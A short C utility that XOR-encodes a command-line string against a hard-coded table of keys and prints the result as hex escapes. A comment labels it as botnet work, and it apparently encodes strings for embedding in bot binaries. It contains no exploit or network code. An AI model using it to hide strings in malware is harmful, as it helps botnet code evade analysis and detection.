#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

/* lalalala big botnet hacks */
uint32_t table_keys[] = {0x38f7f129, 0x4a2a6db, 0x3b608da0, 0x6c34dab4, 0x3a80f431, 0x2893473, 0x1988be99, 0x5f980e32, 0x54ae03d6, 0x120f2780, 0x4205ded8, 0x5eb4e0a6, 0x40cd53f6, 0x2e9c2a07, 0x365bfa9f, 0x7cf02ecb, 0x1a538d95, 0x7a079f4f, 0x12dfa90f, 0x6640d384};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

void add_entry(char *buf, int buf_len) {
    char *cpy = malloc(buf_len + 1);
    strcpy(cpy, buf);

    for (int i = 0; i < TABLE_KEY_LEN; i++) {
        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;


        for (int i = 0; i < buf_len; i++) {
            cpy[i] ^= k1;
            cpy[i] ^= k2;
            cpy[i] ^= k3;
            cpy[i] ^= k4;
        }
    }

    printf("XOR'd %d bytes: '", buf_len);

    for (int i = 0; i < buf_len; i++) {
        printf("\\x%x", (uint8_t)cpy[i]);
    }
    puts("'");
}

/* HUH */
int main(int argc, char **args) {
    add_entry(args[1], strlen(args[1]));
}
